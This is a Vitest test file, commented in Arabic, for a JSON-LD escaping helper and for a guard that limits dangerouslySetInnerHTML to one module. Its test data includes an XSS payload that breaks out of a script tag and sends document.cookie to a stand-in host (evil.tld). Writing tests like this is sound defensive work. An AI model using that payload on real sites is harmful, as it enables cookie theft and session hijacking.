/**
 * حماية JSON-LD من XSS — واختبار يحرس قاعدة «لا dangerouslySetInnerHTML» نفسها.
 *
 * الشق الثاني أهم من الأول على المدى الطويل: أي مطوّر يضيف حقناً خاماً في
 * المستقبل سيفشل هذا الاختبار فوراً، بدل أن يكتشف الثغرة مراجع بشري بالصدفة.
 */
import { readdirSync, readFileSync, statSync } from "node:fs"
import { join } from "node:path"
import { describe, expect, it } from "vitest"
import { escapeJsonLd, jsonLdProps } from "@/lib/seo/jsonLd"

const PAYLOAD = `</script><script>fetch('//evil.tld?c='+document.cookie)</script>`

describe("escapeJsonLd — كسر الوسم", () => {
  it("يمنع إغلاق وسم script مبكراً", () => {
    const out = escapeJsonLd(JSON.stringify({ headline: PAYLOAD }))
    expect(out).not.toContain("</script>")
    expect(out).not.toContain("<script>")
    // لا يبقى أي قوس زاوية خام
    expect(out).not.toMatch(/[<>]/)
  })

  it("يبقي النص صالحاً كـ JSON بعد الهرّب", () => {
    // `\u003c` تمثيل JSON قانوني، فيجب أن يُحلَّل ويعيد القيمة الأصلية
    const out = escapeJsonLd(JSON.stringify({ headline: PAYLOAD, n: 42 }))
    const parsed = JSON.parse(out)
    expect(parsed.headline).toBe(PAYLOAD)
    expect(parsed.n).toBe(42)
  })

  it("يحفظ النص العربي والحركات بلا تشويه", () => {
    const arabic = "العقد شريعة المتعاقدين — الظهير الشريف رقم 1.19.98"
    const out = escapeJsonLd(JSON.stringify({ description: arabic }))
    expect(JSON.parse(out).description).toBe(arabic)
    expect(out).toContain("العقد شريعة المتعاقدين")
  })

  it("يهرّب U+2028 وU+2029 فاصلي الأسطر", () => {
    const out = escapeJsonLd(JSON.stringify({ text: "أ\u2028ب\u2029ج" }))
    expect(out).not.toContain("\u2028")
    expect(out).not.toContain("\u2029")
    expect(JSON.parse(out).text).toBe("أ\u2028ب\u2029ج")
  })

  it("يهرّب علامة & كذلك", () => {
    const out = escapeJsonLd(JSON.stringify({ name: "A & B" }))
    expect(out).not.toContain(" & ")
    expect(JSON.parse(out).name).toBe("A & B")
  })

  it("لا ينفجر على المصفوفات والأشكال المتداخلة", () => {
    const out = escapeJsonLd(JSON.stringify([{ "@type": "FAQPage", a: { b: [`<${PAYLOAD}>`] } }]))
    expect(out).not.toMatch(/[<>]/)
    expect(Array.isArray(JSON.parse(out))).toBe(true)
  })
})

describe("jsonLdProps — شكل المخرَج", () => {
  it("يُرجع نوع الوسم الصحيح ونصاً مهرَّباً", () => {
    const props = jsonLdProps({ "@type": "Article", headline: PAYLOAD })
    expect(props.type).toBe("application/ld+json")
    expect(props.dangerouslySetInnerHTML.__html).not.toMatch(/[<>]/)
    expect(JSON.parse(props.dangerouslySetInnerHTML.__html)["@type"]).toBe("Article")
  })

  it("يتعامل مع undefined بلا كسر (JSON.stringify يُرجع undefined)", () => {
    const props = jsonLdProps(undefined)
    // يجب أن يكون سلسلة قابلة للتحليل، لا undefined
    expect(typeof props.dangerouslySetInnerHTML.__html).toBe("string")
    expect(JSON.parse(props.dangerouslySetInnerHTML.__html)).toEqual({})
  })

  it("يتعامل مع مصفوفة مخططات", () => {
    const props = jsonLdProps([{ "@type": "A" }, { "@type": "B", x: "<b>" }])
    const parsed = JSON.parse(props.dangerouslySetInnerHTML.__html)
    expect(parsed).toHaveLength(2)
    expect(props.dangerouslySetInnerHTML.__html).not.toMatch(/[<>]/)
  })
})

describe("حارس القاعدة: لا يبقى حقن خام في المشروع", () => {
  function walk(dir: string, out: string[] = []): string[] {
    for (const entry of readdirSync(dir)) {
      const full = join(dir, entry)
      const st = statSync(full)
      if (st.isDirectory()) walk(full, out)
      else if (/\.(tsx?|jsx?)$/.test(entry)) out.push(full)
    }
    return out
  }

  const files = walk("src")
  // الوحدة الوحيدة المسموح لها بالحقن
  const ALLOWED = join("src", "lib", "seo", "jsonLd.ts")

  const offenders = files.filter((f) => {
    if (f.endsWith(ALLOWED)) return false
    const src = readFileSync(f, "utf8")
    // نتجاهل الأسطر التي هي مجرد تعليق يشرح التاريخ
    return src
      .split("\n")
      .some((line) => line.includes("dangerouslySetInnerHTML") && !line.trim().startsWith("*") && !line.trim().startsWith("//"))
  })

  it("لا يستعمل dangerouslySetInnerHTML أي ملف خارج jsonLd.ts", () => {
    expect(offenders, `حقن خام في: ${offenders.join(", ")}`).toEqual([])
  })

  it("jsonLd.ts نفسه يهرّب قبل الحقن", () => {
    const src = readFileSync(join("src", "lib", "seo", "jsonLd.ts"), "utf8")
    // الحقن يجب أن يمرّ عبر escapeJsonLd، لا عبر JSON.stringify مباشرةً
    expect(src).toContain("escapeJsonLd(JSON.stringify")
  })
})
